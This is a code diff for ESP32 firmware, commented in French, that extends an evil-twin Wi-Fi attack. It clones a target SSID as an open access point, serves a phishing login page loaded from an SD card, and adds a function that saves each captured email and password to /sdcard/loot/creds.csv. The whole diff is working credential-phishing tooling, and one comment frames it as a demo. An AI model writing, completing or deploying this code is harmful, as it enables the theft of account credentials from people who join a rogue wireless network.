@@ -174,6 +174,25 @@ fn log_credential_to_shell(email: &str, password: &str, ip: &str) {
     info!("═══════════════════════════════════════════");
 }
 
+/// Persiste un credential capturé sur la SD : `/sdcard/loot/creds.csv`
+/// (append, format `timestamp,ssid,email,password`). Non-bloquant : toute
+/// erreur SD est loggée mais n'interrompt pas la capture.
+fn save_credential_to_sd(ssid: &str, email: &str, password: &str) {
+    use std::io::Write;
+    let _ = std::fs::create_dir_all("/sdcard/loot");
+    // Neutralise les virgules/retours pour ne pas casser le CSV.
+    let san = |s: &str| s.replace([',', '\n', '\r'], " ");
+    let line = format!("{},{},{},{}\n", get_timestamp(), san(ssid), san(email), san(password));
+    match std::fs::OpenOptions::new().create(true).append(true).open("/sdcard/loot/creds.csv") {
+        Ok(mut f) => {
+            if let Err(e) = f.write_all(line.as_bytes()) {
+                log::warn!("creds SD: écriture KO: {:?}", e);
+            }
+        }
+        Err(e) => log::warn!("creds SD: ouverture KO: {:?}", e),
+    }
+}
+
 // Fonction de décodage URL simple
 fn url_decode(s: &str) -> String {
     let mut result = String::new();
@@ -211,29 +230,37 @@ fn url_decode(s: &str) -> String {
 
 /// Lance l'evil twin et affiche les stats de capture. `back` arrête le DNS
 /// captif, coupe l'AP et rend le modem.
+#[allow(clippy::too_many_arguments)]
 pub fn run<D>(
     modem: impl WifiModemPeripheral,
     sys_loop: EspSystemEventLoop,
     nvs: EspDefaultNvsPartition,
     display: &mut D,
     back: &PinDriver<'_, Input>,
+    ssid: &str,
+    portal_path: &str,
 ) -> anyhow::Result<()>
 where
     D: DrawTarget<Color = Rgb565>,
     D::Error: core::fmt::Debug,
 {
-    info!("=== Démarrage du portail captif avec phishing ===");
+    info!("=== Evil-twin : SSID cloné '{}' — portail '{}' ===", ssid, portal_path);
+    // Partagés dans les handlers HTTP ('static) via Arc.
+    let portal: Arc<str> = Arc::from(portal_path);
+    let ap_ssid: Arc<str> = Arc::from(ssid);
+
     let mut wifi = BlockingWifi::wrap(EspWifi::new(modem, sys_loop.clone(), Some(nvs))?, sys_loop)?;
+    // AP OUVERTE au nom cloné : join facile pour la démo (pas de mot de passe).
     let config = AccessPointConfiguration {
-        ssid: "FZ-Module".try_into().map_err(|_| anyhow::anyhow!("SSID AP invalide"))?,
-        password: "motdepasse123".try_into().map_err(|_| anyhow::anyhow!("pass AP invalide"))?,
-        auth_method: AuthMethod::WPA2Personal,
+        ssid: ssid.try_into().map_err(|_| anyhow::anyhow!("SSID AP invalide (>32?)"))?,
+        auth_method: AuthMethod::None,
         channel: 6,
+        max_connections: 4,
         ..Default::default()
     };
     wifi.set_configuration(&Configuration::AccessPoint(config))?;
     wifi.start()?;
-    info!("Point d'acces actif : FZ-Module / 192.168.71.1");
+    info!("Point d'acces ouvert actif : {} / 192.168.71.1", ssid);
 
     let ip_u32: u32 = 192 | (168 << 8) | (71 << 16) | (1 << 24);
     unsafe {
@@ -252,16 +279,22 @@ where
 
     let mut server = EspHttpServer::new(&HttpConfig::default())?;
 
-    // Page d'accueil
+    // Page d'accueil : sert le template SD choisi (fallback = page intégrée).
+    let portal_http = portal.clone();
     server.fn_handler("/", Method::Get, move |req| {
         let n = visits_http.fetch_add(1, Ordering::SeqCst) + 1;
-        let html = PAGE.replace("__VISITS__", &n.to_string());
+        let data = std::fs::read(portal_http.as_ref())
+            .unwrap_or_else(|_| PAGE.replace("__VISITS__", &n.to_string()).into_bytes());
         let mut resp = req.into_ok_response()?;
-        resp.write(html.as_bytes())?;
+        // Écriture par chunks : le HTML SD peut être volumineux.
+        for chunk in data.chunks(1024) {
+            resp.write(chunk)?;
+        }
         Ok::<(), esp_idf_svc::io::EspIOError>(())
     })?;
 
     // Endpoint pour capturer les credentials - VERSION ULTRA ROBUSTE
+    let creds_ssid = ap_ssid.clone();
     server.fn_handler("/login", Method::Post, move |mut req| {
         info!("🔍 Nouvelle requête POST /login reçue");
 
@@ -329,6 +362,7 @@ where
                     let ip = req.header("X-Forwarded-For").unwrap_or("192.168.71.x").to_string();
 
                     log_credential_to_shell(&email, &password, &ip);
+                    save_credential_to_sd(&creds_ssid, &email, &password);
 
                     // Réponse de succès
                     let response = r#"{"success":true,"message":"Connexion réussie"}"#;
